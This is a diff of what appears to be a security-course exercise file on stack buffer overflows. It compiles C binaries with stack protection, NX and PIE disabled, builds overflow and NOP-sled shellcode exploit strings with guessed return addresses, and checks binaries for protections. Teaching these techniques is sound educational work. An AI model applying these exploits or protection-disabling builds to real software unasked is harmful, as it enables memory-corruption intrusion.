@@ -142,14 +142,11 @@ def exec_sh(command: str, timeout: Optional[int] = 30) -> subprocess.CompletedPr
     """Execute a shell command and return the result."""
     return subprocess.run(command, shell=True, capture_output=True, text=True, check=False, timeout=timeout)
 
-def compile_vulnerable_binary(source_file: str, output_file: str, extra_flags: str = "") -> bool:
-    def exec_sh(command: str, timeout: Optional[int] = 30) -> subprocess.CompletedProcess:
-        """Execute a shell command and return the result."""
-        return subprocess.run(command, shell=True, capture_output=True, text=True, check=False, timeout=timeout)
 
+def compile_vulnerable_binary(source_file: str, output_file: str, extra_flags: str = "") -> bool:
     """Compile a C program with security features disabled for educational purposes."""
     flags = "-fno-stack-protector -z execstack -no-pie -g"
-    cmd = f"gcc {flags} {extra_flags} -o {output_file} {source_file}"
+    cmd = f"cd w2d1; gcc {flags} {extra_flags} -o {output_file} {source_file}"
     result = exec_sh(cmd)
     return result.returncode == 0
 
@@ -158,10 +155,10 @@ def hex_dump(data: bytes, start_address: int = 0) -> str:
     """Create a hex dump of binary data."""
     lines = []
     for i in range(0, len(data), 16):
-        hex_part = ' '.join(f'{b:02x}' for b in data[i:i + 16])
-        ascii_part = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in data[i:i + 16])
+        hex_part = " ".join(f"{b:02x}" for b in data[i : i + 16])
+        ascii_part = "".join(chr(b) if 32 <= b <= 126 else "." for b in data[i : i + 16])
         lines.append(f"{start_address + i:08x}: {hex_part:<48} |{ascii_part}|")
-    return '\n'.join(lines)
+    return "\n".join(lines)
 
 
 # %%
@@ -359,7 +356,7 @@ def exploit_basic_overflow() -> str:
         exploit = "A" * 16  # Fill password buffer
         exploit += "B" * 16  # Alignment padding (may vary)
         exploit += "X"  # Overwrite authorized with non-zero
-        return exploit + '\n'
+        return exploit + "\n"
     else:
         # TODO: Create an exploit string that:
         #   1. Fills the 16-byte password buffer
@@ -380,12 +377,12 @@ def test_basic_overflow(exploit_basic_overflow: Callable, compile_vulnerable_bin
     # Run the exploit
     exploit = exploit_basic_overflow()
     proc = subprocess.Popen(
-        [' ./first'],
+        ["cd w2d1; ./first"],
         shell=True,
         stdin=subprocess.PIPE,
         stdout=subprocess.PIPE,
         stderr=subprocess.PIPE,
-        text=True
+        text=True,
     )
 
     stdout, stderr = proc.communicate(input=exploit)
@@ -466,15 +463,15 @@ def test_password_extraction(find_password_in_binary: Callable):
     password = find_password_in_binary()
 
     proc = subprocess.Popen(
-        [' ./first'],
+        ["cd w2d1; ./first"],
         shell=True,
         stdin=subprocess.PIPE,
         stdout=subprocess.PIPE,
         stderr=subprocess.PIPE,
-        text=True
+        text=True,
     )
 
-    stdout, stderr = proc.communicate(input=password + '\n')
+    stdout, stderr = proc.communicate(input=password + "\n")
 
     if "Password correct!" in stdout and "Flag: AISB{woo}" in stdout:
         print(f"✓ Found the password: '{password}'")
@@ -651,7 +648,7 @@ def create_shellcode_exploit(buffer_size: int = 128, shellcode: Optional[bytes] 
             )
 
         # Calculate space for NOP sled
-        return_offset = 40  # Adjust based on actual binary
+        return_offset = 50  # Adjust based on actual binary
         nop_sled_size = return_offset - len(shellcode)
 
         if nop_sled_size < 16:
@@ -659,7 +656,7 @@ def create_shellcode_exploit(buffer_size: int = 128, shellcode: Optional[bytes] 
 
         # Build exploit
         nop_sled = b"\x90" * (nop_sled_size // 2)
-        payload = nop_sled + shellcode + nop_sled[:nop_sled_size - len(nop_sled)]
+        payload = nop_sled + shellcode + nop_sled[: nop_sled_size - len(nop_sled)]
 
         # We need to guess an address in our NOP sled
         # This would require knowing the stack address
@@ -669,7 +666,7 @@ def create_shellcode_exploit(buffer_size: int = 128, shellcode: Optional[bytes] 
         # - Brute force (if ASLR is off)
         # - Return-to-libc/ROP instead
 
-        stack_addr = 0x7fffffffe000  # Approximate stack location (no ASLR)
+        stack_addr = 0x7FFFFFFFE000  # Approximate stack location (no ASLR)
         buffer_addr = stack_addr - 0x100  # Guess buffer location
         target_addr = buffer_addr + len(nop_sled) // 2  # Middle of NOP sled
 
@@ -692,9 +689,9 @@ def test_shellcode_basics(create_shellcode_exploit: Callable):
     try:
         exploit = create_shellcode_exploit()
         print(f"✓ Created shellcode exploit: {len(exploit)} bytes")
-        print(f"Exploit structure:")
-        print("  - NOP sled: " + str(exploit.count(b'\\x90')) + " bytes")
-        print("  - Contains syscall: " + str(b'\x0f\x05' in exploit))
+        print("Exploit structure:")
+        print("  - NOP sled: " + str(exploit.count(b"\\x90")) + " bytes")
+        print("  - Contains syscall: " + str(b"\x0f\x05" in exploit))
         return True
     except Exception as e:
         print(f"✗ Failed to create exploit: {e}")
@@ -750,50 +747,56 @@ def check_binary_protections(binary_path: str) -> dict:
         Dictionary of protection_name: enabled (bool)
     """
     if "SOLUTION":
-        def exec_sh(command: str, timeout: Optional[int] = 30) -> subprocess.CompletedProcess:
-            """Execute a shell command and return the result."""
-            return subprocess.run(command, shell=True, capture_output=True, text=True, check=False, timeout=timeout)
-
-        protections = {
-            "NX": False,
-            "PIE": False,
-            "Stack Canary": False,
-            "FORTIFY": False,
-            "RELRO": False
-        }
+        protections = {"NX": False, "PIE": False, "Stack Canary": False, "FORTIFY": False, "RELRO": False}
 
         # Check with checksec or manually
         # For simplicity, we'll check readelf output
 
-        # Check NX bit
-        cmd = f"readelf -l {binary_path} | grep GNU_STACK"
+        # Check NX bit (No eXecute)
+        # Look at GNU_STACK segment - RW means NX enabled, RWE means NX disabled
+        cmd = f"readelf -l {binary_path} | grep -A1 GNU_STACK"
         result = exec_sh(cmd)
-        if result.stdout and "RW" in result.stdout and "RWE" not in result.stdout:
-            protections["NX"] = True
+        if result.returncode == 0 and result.stdout:
+            # Look for the permissions line after GNU_STACK
+            lines = result.stdout.strip().split("\n")
+            for line in lines:
+                if "RW" in line:
+                    # If it's RW (not RWE), then NX is enabled
+                    protections["NX"] = "RWE" not in line
 
-        # Check PIE
+        # Check PIE (Position Independent Executable)
+        # DYN type indicates PIE, EXEC indicates no PIE
         cmd = f"readelf -h {binary_path} | grep 'Type:'"
         result = exec_sh(cmd)
-        if result.stdout and "DYN" in result.stdout:
+        if result.returncode == 0 and result.stdout and "DYN" in result.stdout:
             protections["PIE"] = True
 
         # Check for stack canary
-        cmd = f"objdump -d {binary_path} | grep -E '__stack_chk_fail|%(fs:0x28)|%(gs:0x14)'"
+        # Look for stack protection functions in the binary
+        cmd = f"strings {binary_path} | grep -E '__stack_chk_fail|__stack_chk_guard'"
         result = exec_sh(cmd)
-        if result.stdout:
+        if result.returncode == 0 and result.stdout.strip():
             protections["Stack Canary"] = True
 
         # Check FORTIFY_SOURCE
-        cmd = f"strings {binary_path} | grep -E '_chk@|__fortify'"
+        # Look for fortified function calls
+        cmd = f"strings {binary_path} | grep -E '__.*_chk'"
         result = exec_sh(cmd)
-        if result.stdout:
+        if result.returncode == 0 and result.stdout.strip():
             protections["FORTIFY"] = True
 
-        # Check RELRO
-        cmd = f"readelf -d {binary_path} | grep BIND_NOW"
+        # Check RELRO (RELocation Read-Only)
+        # Check for BIND_NOW flag which indicates full RELRO
+        cmd = f"readelf -d {binary_path} 2>/dev/null | grep BIND_NOW"
         result = exec_sh(cmd)
-        if result.stdout:
+        if result.returncode == 0 and result.stdout.strip():
             protections["RELRO"] = True
+        else:
+            # Check for GNU_RELRO segment which indicates at least partial RELRO
+            cmd = f"readelf -l {binary_path} | grep GNU_RELRO"
+            result = exec_sh(cmd)
+            if result.returncode == 0 and result.stdout.strip():
+                protections["RELRO"] = True
 
         return protections
     else:
@@ -802,18 +805,18 @@ def check_binary_protections(binary_path: str) -> dict:
         pass
 
 
-def test_protection_checking(exec_sh):
+def test_protection_checking(exec_sh, check_binary_protections):
     """Test binary protection checking."""
     print("\nTesting protection checking...")
 
     # First compile with protections enabled
-    exec_sh(" gcc -o first_protected first.c")
+    exec_sh("gcc -o w2d1/first_protected w2d1/first.c")
 
     # Then compile without protections
-    exec_sh(" gcc -fno-stack-protector -z execstack -no-pie -o first_vulnerable first.c")
+    exec_sh("gcc -fno-stack-protector -z execstack -no-pie -o w2d1/first_vulnerable w2d1/first.c")
 
-    protected = check_binary_protections("first_protected")
-    vulnerable = check_binary_protections("first_vulnerable")
+    protected = check_binary_protections("w2d1/first_protected")
+    vulnerable = check_binary_protections("w2d1/first_vulnerable")
 
     print("Protected binary:")
     for prot, enabled in protected.items():
@@ -831,7 +834,8 @@ def test_protection_checking(exec_sh):
         print("\n✗ Could not identify protection differences")
         return False
 
-test_protection_checking(exec_sh)
+
+test_protection_checking(exec_sh, check_binary_protections)
 
 """
 ## Exercise 6: Bypassing Protections (optional)
